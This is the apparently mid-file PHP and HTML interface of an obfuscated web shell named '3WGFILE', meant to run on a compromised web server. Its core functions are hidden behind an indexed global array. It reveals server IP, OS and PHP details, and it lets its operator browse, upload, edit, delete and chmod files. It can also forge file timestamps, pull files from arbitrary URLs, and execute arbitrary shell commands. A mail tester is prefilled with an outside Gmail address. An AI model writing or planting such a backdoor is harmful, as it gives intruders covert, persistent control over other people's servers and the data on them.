$GLOBALS['_q_'][53]($folders);
$GLOBALS['_q_'][53]($files);
$sorted_items = $GLOBALS['_q_'][54]($folders, $files);
$is_writable = $GLOBALS['_q_'][36]($PATH);
$server_ip = isset($_SERVER['SERVER_ADDR']) ? $_SERVER['SERVER_ADDR'] : 'N/A';
$user_ip = $_SERVER['REMOTE_ADDR'];
$php_version = $GLOBALS['_q_'][81]();
$uname = $GLOBALS['_q_'][20]('php_uname') ? php_uname() : 'N/A';
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title><?= $GLOBALS['_q_'][37]($_SERVER["HTTP_HOST"]) ?></title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
    <style>
        body { background-color: #111827; color: #d1d5db; }
        .modal { display: none; }
        .modal.active { display: flex; }
        .fade-in-out { animation: fadeInOut 4s forwards; }
        @keyframes fadeInOut { 0% { opacity: 0; transform: translateY(-20px); } 10% { opacity: 1; transform: translateY(0); } 90% { opacity: 1; transform: translateY(0); } 100% { opacity: 0; transform: translateY(-20px); } }
        .icon-sm { width: 1.1rem; height: 1.1rem; }
        .icon-md { width: 1.25rem; height: 1.25rem; }
        .btn { display: inline-flex; align-items: center; gap: 0.5rem; padding: 0.5rem 1rem; border-radius: 0.5rem; font-weight: 600; transition: background-color 0.2s; }
        .btn-blue { background-color: #3b82f6; color: white; } .btn-blue:hover { background-color: #2563eb; }
        .btn-green { background-color: #22c55e; color: white; } .btn-green:hover { background-color: #16a34a; }
        .btn-yellow { background-color: #eab308; color: white; } .btn-yellow:hover { background-color: #ca8a04; }
        .btn-gray { background-color: #6b7280; color: white; } .btn-gray:hover { background-color: #4b5563; }
        .btn-red { background-color: #ef4444; color: white; } .btn-red:hover { background-color: #dc2626; }
        .btn-orange { background-color: #f97316; color: white; } .btn-orange:hover { background-color: #ea580c; }
        .path-display {
            word-break: break-all;
        }
        select {
            -webkit-appearance: none;
            -moz-appearance: none;
            appearance: none;
            background-image: url('data:image/svg+xml;charset=US-ASCII,%3Csvg%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%20width%3D%22292.4%22%20height%3D%22292.4%22%3E%3Cpath%20fill%3D%22%23d1d5db%22%20d%3D%22M287%2069.4a17.6%2017.6%200%200%200-13-5.4H18.4c-5%200-9.3%201.8-12.9%205.4A17.6%2017.6%200%200%200%200%2082.2c0%205%201.8%209.3%205.4%2012.9l128%20127.9c3.6%203.6%207.8%205.4%2012.8%205.4s9.2-1.8%2012.8-5.4L287%2095c3.5-3.5%205.4-7.8%205.4-12.8%200-5-1.9-9.2-5.5-12.8z%22%2F%3E%3C%2Fsvg%3E');
            background-repeat: no-repeat;
            background-position: right 0.7rem center;
            background-size: .65em auto;
            padding-right: 2.5rem;
        }
    </style>
</head>
<body class="font-sans">
    <?php display_message(); ?>
    <div class="container mx-auto p-2 sm:p-4">
        <div class="bg-gray-800 rounded-lg shadow-xl p-4 mb-4 relative">
            <div class="flex justify-between items-start">
                <div class="flex-shrink min-w-0">
                    <h1 class="hidden md:block text-xl sm:text-2xl text-white font-bold"><pre>
   
   
  
</pre></h1>
                    <h1 class="block md:hidden text-2xl text-white font-bold py-3">3WGFILE</h1>
                    <p class="text-xs sm:text-sm text-gray-400">Server: <?= $server_ip ?> | Client: <?= $user_ip ?> | PHP: <?= $php_version ?></p>
                    <div class="text-xs sm:text-sm text-gray-400 truncate">OS: <?= $GLOBALS['_q_'][37]($uname) ?></div>
                </div>
                <div class="relative flex-shrink-0">
                    <button id="hamburger-menu-button" class="text-gray-300 hover:text-white focus:outline-none p-2 mt-2">
                        <i class="fas fa-bars fa-lg"></i>
                    </button>
                    <div id="mobile-menu" class="hidden opacity-0 scale-95 absolute right-0 mt-2 w-56 bg-gray-700 rounded-lg shadow-xl z-50 transition-all duration-200 ease-out transform origin-top-right">
                        <div class="py-1">
                            <a href="?p=<?= $home_path_encoded ?>" class="flex items-center gap-3 px-4 py-3 text-sm text-gray-200 hover:bg-gray-600 rounded-t-lg"><i class="fas fa-home w-5 text-center"></i>Home</a>
                            <button onclick="showModalAndCloseMenu('upload')" class="w-full text-left flex items-center gap-3 px-4 py-3 text-sm text-gray-200 hover:bg-gray-600"><i class="fas fa-upload w-5 text-center"></i>Upload</button>
                            <button onclick="showModalAndCloseMenu('download_url')" class="w-full text-left flex items-center gap-3 px-4 py-3 text-sm text-gray-200 hover:bg-gray-600"><i class="fas fa-cloud-download-alt w-5 text-center"></i>URL</button>
                            <button onclick="showModalAndCloseMenu('search')" class="w-full text-left flex items-center gap-3 px-4 py-3 text-sm text-gray-200 hover:bg-gray-600"><i class="fas fa-search w-5 text-center"></i>Search</button>
                            <button onclick="showModalAndCloseMenu('create_folder')" class="w-full text-left flex items-center gap-3 px-4 py-3 text-sm text-gray-200 hover:bg-gray-600"><i class="fas fa-folder-plus w-5 text-center"></i>Folder</button>
                            <button onclick="showModalAndCloseMenu('create_file')" class="w-full text-left flex items-center gap-3 px-4 py-3 text-sm text-gray-200 hover:bg-gray-600"><i class="fas fa-file-alt w-5 text-center"></i>File</button>
                            <button onclick="showModalAndCloseMenu('cmd')" class="w-full text-left flex items-center gap-3 px-4 py-3 text-sm text-gray-200 hover:bg-gray-600"><i class="fas fa-terminal w-5 text-center"></i>CMD</button>
                            <button onclick="showModalAndCloseMenu('mail_test')" class="w-full text-left flex items-center gap-3 px-4 py-3 text-sm text-gray-200 hover:bg-gray-600"><i class="fas fa-envelope w-5 text-center"></i>Test Mail</button>
                            <?php if ($auth_enabled): ?>
                                <div class="border-t border-gray-600 my-1"></div>
                                <a href="?logout=true" class="flex items-center gap-3 px-4 py-3 text-sm text-red-400 hover:bg-gray-600 rounded-b-lg"><i class="fas fa-sign-out-alt w-5 text-center"></i>Logout</a>
                            <?php endif; ?>
                        </div>
                    </div>
                </div>
            </div>
            <div class="mt-3 flex items-start gap-2 text-sm text-gray-300 flex-wrap">
                <span class="w-3 h-3 rounded-full flex-shrink-0 <?= $is_writable ? 'bg-green-400' : 'bg-red-500' ?>" title="<?= $is_writable ? 'Writable' : 'Not Writable' ?>"></span>
                <span class="font-semibold flex-shrink-0">Path:</span>
                <div class="flex-grow path-display">
                <?php
                $cumulative_path = '';
                $path_parts = $GLOBALS['_q_'][52](DIRECTORY_SEPARATOR, $GLOBALS['_q_'][39]($PATH));
                echo '<a href="?p='.encodePath($path_parts[0] ? $path_parts[0] : '/').'" class="text-blue-400 hover:underline">'.($path_parts[0] ? $GLOBALS['_q_'][37]($path_parts[0]) : 'Root').'</a>';
                $cumulative_path = $path_parts[0];
                unset($path_parts[0]);
                foreach ($path_parts as $part) {
                    if (empty($part)) continue;
                    $cumulative_path .= DIRECTORY_SEPARATOR . $part;
                    echo '<span class="text-gray-500">/</span><a href="?p='.encodePath($cumulative_path).'" class="text-blue-400 hover:underline">'.$GLOBALS['_q_'][37]($part).'</a>';
                }
                ?>
                </div>
            </div>
        </div>

        <?php if ($action === 'view'): ?>
        <div class="bg-gray-800 rounded-lg shadow-xl p-4 mb-4">
            <h2 class="text-xl text-white font-bold mb-2">Viewing: <?= $GLOBALS['_q_'][37]($GLOBALS['_q_'][41]($item_path)) ?></h2>
            <form method="POST">
                <input type="hidden" name="action" value="edit_file">
                <input type="hidden" name="file_path" value="<?= $GLOBALS['_q_'][37]($item_path) ?>">
                <textarea name="content" class="w-full h-96 bg-gray-900 text-white p-2 rounded font-mono text-sm"><?= $content ?></textarea>
                <div class="mt-4 flex gap-2">
                    <button type="submit" class="btn btn-blue"><i class="fas fa-save icon-md"></i>Save</button>
                    <a href="?p=<?= $current_path_encoded ?>" class="btn btn-gray"><i class="fas fa-arrow-left icon-md"></i>Back</a>
                </div>
            </form>
        </div>
        <?php else: ?>
        <form id="bulk-action-form" method="POST">
            <input type="hidden" name="action" value="bulk_action">
            <input type="hidden" name="bulk_operation" id="bulk-operation" value="">
            <input type="hidden" name="destination_folder" id="destination-folder-input" value="">
            
            <div class="overflow-x-auto bg-gray-800 rounded-lg shadow-xl">
                <table class="w-full min-w-[800px] text-sm">
                    <thead class="bg-gray-700/50">
                        <tr>
                            <th class="p-3 w-8"><input type="checkbox" id="select-all-checkbox" class="bg-gray-900 border-gray-600 rounded"></th>
                            <th class="p-3 text-left font-semibold text-gray-300">Name</th>
                            <th class="p-3 text-left font-semibold text-gray-300">Size</th>
                            <th class="p-3 text-left font-semibold text-gray-300">Perms</th>
                            <th class="p-3 text-left font-semibold text-gray-300">Modified</th>
                            <th class="p-3 text-left font-semibold text-gray-300">Actions</th>
                        </tr>
                    </thead>
                    <tbody class="divide-y divide-gray-700">
                        <?php if (getParentPath($PATH)): ?>
                        <tr>
                            <td class="p-3" colspan="6">
                                <a href="?p=<?= encodePath(getParentPath($PATH)) ?>" class="flex items-center gap-2 text-blue-400 hover:underline">
                                    <i class="fas fa-level-up-alt h-5 w-5"></i>
                                    ..
                                </a>
                            </td>
                        </tr>
                        <?php endif; ?>

                        <?php foreach($sorted_items as $item): 
                            $item_path_encoded = encodePath($item['path']);
                            $is_item_dir = $item['is_dir'];
                            $perms = getPerms($item['path']);
                            $item_is_writable = $is_item_dir ? $GLOBALS['_q_'][36]($item['path']) : false;
                            $icon_color = $is_item_dir && !$item_is_writable ? 'text-red-400' : 'text-blue-400';
                        ?>
                        <tr class="hover:bg-gray-700/50 item-row" data-path="<?= $item_path_encoded ?>" data-name="<?= $GLOBALS['_q_'][37]($item['name']) ?>" data-is-dir="<?= $is_item_dir ? '1' : '0' ?>">
                            <td class="p-3 text-center"><input type="checkbox" name="selected_items[]" value="<?= $item_path_encoded ?>" class="item-checkbox bg-gray-900 border-gray-600 rounded"></td>
                            <td class="p-3">
                                <a href="<?= $is_item_dir ? '?p='.$item_path_encoded : '?action=view&item='.$item_path_encoded.'&p='.$current_path_encoded ?>" class="flex items-center gap-2 <?= $icon_color ?> hover:underline">
                                    <i class="icon-md flex-shrink-0 <?= $is_item_dir ? 'fas fa-folder' : 'fas fa-file-alt' ?>"></i>
                                    <span class="truncate"><?= $GLOBALS['_q_'][37]($item['name']) ?></span>
                                </a>
                            </td>
                            <td class="p-3 whitespace-nowrap"><?= $is_item_dir ? '-' : formatSize($GLOBALS['_q_'][55]($item['path'])) ?></td>
                            <td class="p-3 whitespace-nowrap">
                                <a href="#" onclick="showChmodModal('<?= $item_path_encoded ?>', '<?= $perms ?>')" class="font-mono text-yellow-400 hover:underline"><?= $perms ?></a>
                            </td>
                            <td class="p-3 whitespace-nowrap"><?= $GLOBALS['_q_'][56]('Y-m-d H:i', $GLOBALS['_q_'][57]($item['path'])) ?></td>
                            <td class="p-3 whitespace-nowrap flex items-center gap-x-3">
                                <a href="?action=download&item=<?= $item_path_encoded ?>" class="text-green-400 hover:underline" title="Download"><i class="fas fa-download"></i></a>
                                <a href="#" onclick="showRenameModal('<?= $GLOBALS['_q_'][37]($item['name']) ?>')" class="text-blue-400 hover:underline" title="Rename"><i class="fas fa-edit"></i></a>
                                <a href="#" onclick="showTouchModal('<?= $item_path_encoded ?>', '<?= $GLOBALS['_q_'][37]($item['name']) ?>')" class="text-purple-400 hover:underline" title="Edit Timestamp"><i class="fas fa-clock"></i></a>
                                <a href="?action=delete&item=<?= $item_path_encoded ?>&p=<?= $current_path_encoded ?>" onclick="return confirm('Are you sure?')" class="text-red-400 hover:underline" title="Delete"><i class="fas fa-trash-alt"></i></a>
                                
                                <?php if (!$is_item_dir):
                                    $path_without_root = $GLOBALS['_q_'][84]($_SERVER['DOCUMENT_ROOT'], '', $item['path']); // str_replace()
                                    $web_path = $GLOBALS['_q_'][84](DIRECTORY_SEPARATOR, '/', $path_without_root); // str_replace()
                                ?>
                                    <a href="<?= $web_path ?>" target="_blank" class="text-cyan-400 hover:underline" title="Run/View in New Tab"><i class="fas fa-eye"></i></a>
                                    
                                    <?php if ($GLOBALS['_q_'][49]($GLOBALS['_q_'][33]($item['path'], PATHINFO_EXTENSION)) === 'zip'): ?>
                                        <a href="#" onclick="unzipItem('<?= $item_path_encoded ?>'); return false;" class="text-orange-400 hover:underline" title="Unzip"><i class="fas fa-file-archive"></i></a>
                                    <?php endif; ?>
                                <?php endif; ?>
                            </td>
                        </tr>
                        <?php endforeach; ?>
                    </tbody>
                </table>
            </div>
            <div class="bg-gray-800 rounded-b-lg shadow-xl p-3 mt-0 flex items-center gap-3">
                <select id="bulk-action-select" class="bg-gray-700 border border-gray-600 text-white text-sm rounded-lg focus:ring-blue-500 focus:border-blue-500 block w-auto p-2">
                    <option value="" selected disabled>Choose Action&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</option>
                    <option value="copy">Copy</option>
                    <option value="move">Move</option>
                    <option value="zip">Zip</option>
                    <option value="delete">Delete</option>
                </select>
                <button type="button" id="bulk-apply-btn" class="btn btn-blue text-sm">Apply</button>
            </div>
        </form>
        <?php endif; ?>
    </div>

    <div id="bulk-move-modal" class="modal fixed inset-0 bg-black bg-opacity-75 items-center justify-center p-4">
        <div class="bg-gray-800 rounded-lg shadow-xl p-6 w-full max-w-md">
            <h2 id="bulk-modal-title" class="text-xl text-white font-bold mb-4">Move/Copy Selected Items</h2>
            <div>
                <label for="destination_folder" class="block text-sm font-medium text-gray-300 mb-1">Destination Folder Path:</label>
                <input type="text" id="destination_folder" name="destination_folder_display" placeholder="e.g., /var/www/html/backup" class="w-full bg-gray-900 text-white p-2 rounded" value="<?= $GLOBALS['_q_'][37]($PATH) ?>">
                <p class="text-xs text-gray-400 mt-1">Enter the absolute path of the destination folder.</p>
            </div>
            <div class="mt-4 flex justify-end gap-2">
                <button type="button" class="btn btn-gray" onclick="hideAllModals()">Cancel</button>
                <button type="button" id="confirm-bulk-action" class="btn btn-blue">Confirm</button>
            </div>
        </div>
    </div>
    <div id="upload-modal" class="modal fixed inset-0 bg-black bg-opacity-75 items-center justify-center p-4">
        <div class="bg-gray-800 rounded-lg shadow-xl p-6 w-full max-w-md">
            <h2 class="text-xl text-white font-bold mb-4">Upload Files</h2>
            <form method="POST" enctype="multipart/form-data">
                <input type="hidden" name="action" value="upload">
                <input type="file" name="files[]" multiple class="block w-full text-sm text-gray-300 file:mr-4 file:py-2 file:px-4 file:rounded-full file:border-0 file:text-sm file:font-semibold file:bg-blue-50 file:text-blue-700 hover:file:bg-blue-100"/>
                <div class="mt-4 flex justify-end gap-2">
                    <button type="button" class="btn btn-gray" onclick="hideAllModals()">Cancel</button>
                    <button type="submit" class="btn btn-blue">Upload</button>
                </div>
            </form>
        </div>
    </div>
    <div id="create_file-modal" class="modal fixed inset-0 bg-black bg-opacity-75 items-center justify-center p-4">
        <div class="bg-gray-800 rounded-lg shadow-xl p-6 w-full max-w-md">
            <h2 class="text-xl text-white font-bold mb-4">Create New File</h2>
            <form method="POST">
                <input type="hidden" name="action" value="create_file">
                <input type="text" name="name" placeholder="File name" class="w-full bg-gray-900 text-white p-2 rounded" required>
                <div class="mt-4 flex justify-end gap-2">
                    <button type="button" class="btn btn-gray" onclick="hideAllModals()">Cancel</button>
                    <button type="submit" class="btn btn-green">Create</button>
                </div>
            </form>
        </div>
    </div>
    <div id="create_folder-modal" class="modal fixed inset-0 bg-black bg-opacity-75 items-center justify-center p-4">
        <div class="bg-gray-800 rounded-lg shadow-xl p-6 w-full max-w-md">
            <h2 class="text-xl text-white font-bold mb-4">Create New Folder</h2>
            <form method="POST">
                <input type="hidden" name="action" value="create_folder">
                <input type="text" name="name" placeholder="Folder name" class="w-full bg-gray-900 text-white p-2 rounded" required>
                <div class="mt-4 flex justify-end gap-2">
                    <button type="button" class="btn btn-gray" onclick="hideAllModals()">Cancel</button>
                    <button type="submit" class="btn btn-green">Create</button>
                </div>
            </form>
        </div>
    </div>
    <div id="rename-modal" class="modal fixed inset-0 bg-black bg-opacity-75 items-center justify-center p-4">
        <div class="bg-gray-800 rounded-lg shadow-xl p-6 w-full max-w-md">
            <h2 class="text-xl text-white font-bold mb-4">Rename Item</h2>
            <form method="POST">
                <input type="hidden" name="action" value="rename">
                <input type="hidden" name="old_name" id="rename-old-name">
                <input type="text" name="new_name" id="rename-new-name" class="w-full bg-gray-900 text-white p-2 rounded" required>
                <div class="mt-4 flex justify-end gap-2">
                    <button type="button" class="btn btn-gray" onclick="hideAllModals()">Cancel</button>
                    <button type="submit" class="btn btn-blue">Rename</button>
                </div>
            </form>
        </div>
    </div>
    <div id="chmod-modal" class="modal fixed inset-0 bg-black bg-opacity-75 items-center justify-center p-4">
        <div class="bg-gray-800 rounded-lg shadow-xl p-6 w-full max-w-md">
            <h2 class="text-xl text-white font-bold mb-4">Change Permissions</h2>
            <form method="GET">
                <input type="hidden" name="action" value="chmod">
                <input type="hidden" name="item" id="chmod-item-path">
                <input type="hidden" name="p" value="<?= $current_path_encoded ?>">
                <input type="text" name="perms" id="chmod-perms" class="w-full bg-gray-900 text-white p-2 rounded font-mono" required>
                <div class="mt-4 flex justify-end gap-2">
                    <button type="button" class="btn btn-gray" onclick="hideAllModals()">Cancel</button>
                    <button type="submit" class="btn btn-yellow">Set</button>
                </div>
            </form>
        </div>
    </div>
    <div id="touch-modal" class="modal fixed inset-0 bg-black bg-opacity-75 items-center justify-center p-4">
        <div class="bg-gray-800 rounded-lg shadow-xl p-6 w-full max-w-md">
            <h2 class="text-xl text-white font-bold mb-4">Edit Timestamp</h2>
            <form method="POST">
                <input type="hidden" name="action" value="touch">
                <input type="hidden" name="item" id="touch-item-path">
                <p id="touch-item-name" class="text-gray-300 mb-2 truncate"></p>
                <input type="datetime-local" name="time" class="w-full bg-gray-900 text-white p-2 rounded" required>
                <div class="mt-4 flex justify-end gap-2">
                    <button type="button" class="btn btn-gray" onclick="hideAllModals()">Cancel</button>
                    <button type="submit" class="btn btn-blue">Update</button>
                </div>
            </form>
        </div>
    </div>
    <div id="cmd-modal" class="modal fixed inset-0 bg-black bg-opacity-75 items-center justify-center p-4">
        <div class="bg-gray-800 rounded-lg shadow-xl p-6 w-full max-w-2xl h-3/4 flex flex-col">
            <h2 class="text-xl text-white font-bold mb-4">Execute Command</h2>
            <div id="cmd-output" class="flex-grow bg-gray-900 text-white p-2 rounded overflow-y-auto mb-2 font-mono text-sm whitespace-pre-wrap"></div>
            <div class="flex gap-2">
                <input type="text" id="cmd-input" placeholder="Enter command" class="flex-grow bg-gray-900 text-white p-2 rounded-lg">
            </div>
            <div class="flex gap-2 mt-2 justify-end">
                <button type="button" class="btn btn-gray" onclick="hideAllModals()">Close</button>
                <button id="cmd-execute" class="btn btn-blue">Execute</button>
            </div>
        </div>
    </div>
    <div id="download_url-modal" class="modal fixed inset-0 bg-black bg-opacity-75 items-center justify-center p-4">
        <div class="bg-gray-800 rounded-lg shadow-xl p-6 w-full max-w-md">
            <h2 class="text-xl text-white font-bold mb-4">Download File from URL</h2>
            <form method="POST">
                <input type="hidden" name="action" value="download_url">
                <input type="text" name="url" placeholder="Enter file URL" class="w-full bg-gray-900 text-white p-2 rounded mb-3" required>
                <input type="text" name="filename" placeholder="Save as (e.g., file.zip)" class="w-full bg-gray-900 text-white p-2 rounded" required>
                <div class="mt-4 flex justify-end gap-2">
                    <button type="button" class="btn btn-gray" onclick="hideAllModals()">Cancel</button>
                    <button type="submit" class="btn btn-blue">Download</button>
                </div>
            </form>
        </div>
    </div>
    <div id="mail_test-modal" class="modal fixed inset-0 bg-black bg-opacity-75 items-center justify-center p-4">
        <div class="bg-gray-800 rounded-lg shadow-xl p-6 w-full max-w-md">
            <h2 class="text-xl text-white font-bold mb-4">Mail Tester</h2>
            <form method="POST">
                <input type="hidden" name="action" value="mail_test">
                <label for="to_email" class="block text-sm font-medium text-gray-300 mb-1">Recipient Email:</label>
                <input type="email" name="to_email" id="to_email" value="zerosec235@gmail.com" class="w-full bg-gray-900 text-white p-2 rounded" required>
                <div class="mt-4 flex justify-end gap-2">
                    <button type="button" class="btn btn-gray" onclick="hideAllModals()">Cancel</button>
                    <button type="submit" class="btn btn-yellow">Send Test</button>
                </div>
            </form>
        </div>
    </div>
    <div id="search-modal" class="modal fixed inset-0 bg-black bg-opacity-75 items-center justify-center p-4">
        <div class="bg-gray-800 rounded-lg shadow-xl p-6 w-full max-w-2xl h-3/4 flex flex-col">
            <h2 class="text-xl text-white font-bold mb-4">Search in current directory</h2>
            <div class="flex gap-2 mb-4">
                <input type="text" id="search-query-input" placeholder="Enter file or folder name..." class="flex-grow bg-gray-900 text-white p-2 rounded-lg">
            </div>
            <div id="search-results-container" class="flex-grow bg-gray-900 text-white p-2 rounded overflow-y-auto font-mono text-sm">
                <p class="text-gray-500">Enter a query and press Search.</p>
            </div>
             <div class="flex gap-2 mt-4 justify-end">
                <button type="button" class="btn btn-gray" onclick="hideAllModals()">Close</button>
                <button id="execute-search-btn" class="btn btn-blue">Search</button>
            </div>
        </div>
    </div>

<script>
document.addEventListener('DOMContentLoaded', function() {
    // --- Existing Modal and Helper Functions ---
    const modals = document.querySelectorAll('.modal');
    function hideAllModals() {
        modals.forEach(function(m) { m.classList.remove('active'); });
    }
    window.showModal = function(id) {
        hideAllModals();
        const modal = document.getElementById(id + '-modal');
        if (modal) modal.classList.add('active');
    };
    window.hideAllModals = hideAllModals;
    window.showRenameModal = function(oldName) {
        document.getElementById('rename-old-name').value = oldName;
        document.getElementById('rename-new-name').value = oldName;
        showModal('rename');
    }
    window.showChmodModal = function(itemPath, perms) {
        document.getElementById('chmod-item-path').value = itemPath;
        document.getElementById('chmod-perms').value = perms;
        showModal('chmod');
    }
    window.showTouchModal = function(itemPath, itemName) {
        document.getElementById('touch-item-path').value = itemPath;
        document.getElementById('touch-item-name').innerText = 'Item: ' + itemName;
        const now = new Date();
        now.setMinutes(now.getMinutes() - now.getTimezoneOffset());
        document.querySelector('#touch-modal input[name="time"]').value = now.toISOString().slice(0,16);
        showModal('touch');
    }
    window.unzipItem = function(itemPath) {
        if (confirm('Unzip this file?')) {
            alert('Unzipping... please wait.');
            fetch('?action=unzip&item=' + itemPath + '&p=<?= $current_path_encoded ?>')
                .then(function(response) { return response.json(); })
                .then(function(result) {
                    if (result.status === 'success') {
                        alert('Unzipped successfully!');
                        window.location.reload();
                    } else {
                        alert('Error: ' + result.data);
                    }
                })
                .catch(function(e) {
                    alert('Failed to unzip file.');
                });
        }
    };
    
    // --- CMD ---
    const cmdInput = document.getElementById('cmd-input');
    const cmdOutput = document.getElementById('cmd-output');
    const cmdExecute = document.getElementById('cmd-execute');
    if (cmdExecute) {
        const executeCmd = function() {
            const command = cmdInput.value;
            if (!command) return;
            cmdOutput.innerHTML += '<div class="text-yellow-400">> ' + command + '</div>';
            cmdInput.value = '';
            fetch('?action=cmd&command=' + encodeURIComponent(command) + '&p=<?= $current_path_encoded ?>')
                .then(function(response) { return response.json(); })
                .then(function(result) {
                    const outputText = result.data.replace(/\\n/g, '<br>');
                    cmdOutput.innerHTML += '<div>' + outputText + '</div>';
                    cmdOutput.scrollTop = cmdOutput.scrollHeight;
                })
                .catch(function(e) {
                    cmdOutput.innerHTML += '<div class="text-red-500">Request failed.</div>';
                    cmdOutput.scrollTop = cmdOutput.scrollHeight;
                });
        };
        cmdExecute.addEventListener('click', executeCmd);
        cmdInput.addEventListener('keydown', function(e) { if(e.key === 'Enter') executeCmd(); });
    }

    // --- Flash Message ---
    const flash = document.getElementById('flash-message');
    if(flash) setTimeout(function() { flash.style.display = 'none'; }, 4000);

    // --- Bulk Actions ---
    const selectAllCheckbox = document.getElementById('select-all-checkbox');
    const itemCheckboxes = document.querySelectorAll('.item-checkbox');
    const bulkForm = document.getElementById('bulk-action-form');
    if(bulkForm) {
        const bulkOperationInput = document.getElementById('bulk-operation');
        const destinationFolderInput = document.getElementById('destination-folder-input');

        if (selectAllCheckbox) {
            selectAllCheckbox.addEventListener('change', function(e) {
                itemCheckboxes.forEach(function(cb) {
                    cb.checked = e.target.checked;
                });
            });
        }

        const getSelectedItems = function() {
            var selected = [];
            itemCheckboxes.forEach(function(cb) {
                if (cb.checked) {
                    selected.push(cb);
                }
            });
            return selected;
        };
        
        document.getElementById('bulk-apply-btn').addEventListener('click', function() {
            const selectedAction = document.getElementById('bulk-action-select').value;
            if (getSelectedItems().length === 0) {
                alert('Please select at least one item.');
                return;
            }
            if (!selectedAction) {
                alert('Please choose an action from the dropdown.');
                return;
            }
            bulkOperationInput.value = selectedAction;
            if (selectedAction === 'copy' || selectedAction === 'move') {
                const title = selectedAction.charAt(0).toUpperCase() + selectedAction.slice(1);
                document.getElementById('bulk-modal-title').innerText = title + ' Selected Items';
                showModal('bulk-move');
            } else if (selectedAction === 'delete') {
                if (confirm('Are you sure you want to delete the selected items? This cannot be undone.')) {
                    bulkForm.submit();
                }
            } else if (selectedAction === 'zip') {
                 if (confirm('Create a zip archive from the selected items?')) {
                    bulkForm.submit();
                }
            }
        });

        document.getElementById('confirm-bulk-action').addEventListener('click', function() {
            const destination = document.getElementById('destination_folder').value;
            if (!destination) {
                alert('Please enter a destination folder path.');
                return;
            }
            destinationFolderInput.value = destination;
            bulkForm.submit();
        });
    }

    // --- HAMBURGER MENU SCRIPT (WITH ANIMATION) --- //
    const hamburgerButton = document.getElementById('hamburger-menu-button');
    const mobileMenu = document.getElementById('mobile-menu');

    function toggleMenu() {
        const isHidden = mobileMenu.classList.contains('hidden');
        if (isHidden) {
            mobileMenu.classList.remove('hidden');
            setTimeout(function() {
                mobileMenu.classList.remove('opacity-0', 'scale-95');
                mobileMenu.classList.add('opacity-100', 'scale-100');
            }, 10);
        } else {
            mobileMenu.classList.remove('opacity-100', 'scale-100');
            mobileMenu.classList.add('opacity-0', 'scale-95');
            setTimeout(function() {
                mobileMenu.classList.add('hidden');
            }, 200); // Duration must match the transition duration in HTML
        }
    }

    if (hamburgerButton && mobileMenu) {
        hamburgerButton.addEventListener('click', function(event) {
            event.stopPropagation();
            toggleMenu();
        });
    }

    document.addEventListener('click', function(event) {
        const isVisible = !mobileMenu.classList.contains('hidden');
        if (isVisible && !mobileMenu.contains(event.target) && !hamburgerButton.contains(event.target)) {
            toggleMenu();
        }
    });
    
    window.showModalAndCloseMenu = function(modalId) {
        showModal(modalId);
        const isVisible = !mobileMenu.classList.contains('hidden');
        if (isVisible) {
            toggleMenu();
        }
    };
    
    // --- NEW SCRIPT: Search Feature --- //
    const executeSearchBtn = document.getElementById('execute-search-btn');
    const searchQueryInput = document.getElementById('search-query-input');
    const searchResultsContainer = document.getElementById('search-results-container');

    const performSearch = function() {
        const query = searchQueryInput.value;
        if (!query) {
            searchResultsContainer.innerHTML = '<p class="text-yellow-400">Please enter a search query.</p>';
            return;
        }

        searchResultsContainer.innerHTML = '<p class="text-gray-400">Searching...</p>';
        const currentPath = '<?= $current_path_encoded ?>';
        
        fetch('?action=search&query=' + encodeURIComponent(query) + '&p=' + currentPath)
            .then(function(response) { return response.json(); })
            .then(function(result) {
                if (result.status === 'success' && result.data.length > 0) {
                    searchResultsContainer.innerHTML = ''; // Clear previous results
                    result.data.forEach(function(item) {
                        const iconClass = item.is_dir ? 'fas fa-folder text-blue-400' : 'fas fa-file-alt text-gray-300';
                        const link = document.createElement('a');
                        link.href = '?p=' + item.parent_dir_encoded;
                        link.className = 'flex items-center gap-2 p-2 hover:bg-gray-800 rounded-md break-all';
                        link.innerHTML = '<i class="' + iconClass + ' w-5 text-center"></i><span>' + item.path + '</span>';
                        searchResultsContainer.appendChild(link);
                    });
                } else {
                    searchResultsContainer.innerHTML = '<p class="text-gray-500">No results found.</p>';
                }
            })
            .catch(function(e) {
                searchResultsContainer.innerHTML = '<p class="text-red-500">An error occurred during search.</p>';
            });
    };
    
    if (executeSearchBtn) {
        executeSearchBtn.addEventListener('click', performSearch);
        searchQueryInput.addEventListener('keydown', function(e) {
            if (e.key === 'Enter') {
                performSearch();
            }
        });
    }

});
</script>
</body>
</html>
